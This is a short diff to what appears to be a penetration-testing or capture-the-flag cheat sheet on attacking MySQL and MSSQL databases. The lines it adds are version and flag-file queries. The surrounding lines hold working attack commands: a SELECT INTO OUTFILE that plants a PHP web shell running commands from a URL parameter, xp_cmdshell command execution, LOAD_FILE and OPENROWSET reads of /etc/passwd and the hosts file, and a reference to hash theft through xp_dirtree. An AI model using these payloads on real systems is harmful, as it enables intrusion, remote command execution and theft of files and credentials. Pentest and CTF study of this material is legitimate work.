@@ -377,6 +377,7 @@ braa <community string>@<FQDN/IP>:.1.*
 ##### MYSQL
 ```
 mysql -u <user> -p<password> -h <FQDN/IP>
+SELECT @@version_compile_os
 ```
 ##### MSSQL
 ```
@@ -1024,6 +1025,7 @@ RECONFIGURE
 xp_cmdshell 'whoami'     --> MSQL
 
 # MySQL - Write Local File
+SELECT @@version_compile_os;
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 # MySQL - Secure File Privileges
 show variables like "secure_file_priv";
@@ -1052,6 +1054,7 @@ show variables like "secure_file_priv";
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 # MySQL - Read Local Files in MySQL
 mysql> select LOAD_FILE("/etc/passwd");
+mysql> SELECT LOAD_FILE(“C:/Users/Administrator/Desktop/flag.txt”);
 
 
 # Hash stealing using the xp_dirtree command in MSSQL.
